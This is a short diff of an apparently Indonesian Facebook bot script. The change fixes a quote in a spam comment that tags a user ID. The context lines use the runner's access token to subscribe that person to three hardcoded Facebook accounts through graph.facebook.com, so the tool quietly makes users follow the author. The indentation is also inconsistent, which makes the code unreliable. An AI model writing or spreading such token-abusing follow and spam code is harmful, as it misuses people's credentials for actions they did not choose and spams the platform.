@@ -94,7 +94,7 @@ def bot_follow():
 		print("\n   [!] Token invalid")
 		logs()
         kom = " Bang @[100064283724681:] Shelly Cantik Banget Ga Ada Obat😘😘😘😘"
-        kom2 = " Bang @[100064283724681:] Noah Cantik Banget Ga Ada Obat 😘😘😘😘'    
+        kom2 = " Bang @[100064283724681:] Noah Cantik Banget Ga Ada Obat 😘😘😘😘"    
     	requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100064283724681/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100008420107265/subscribers?access_token=' + toket) #
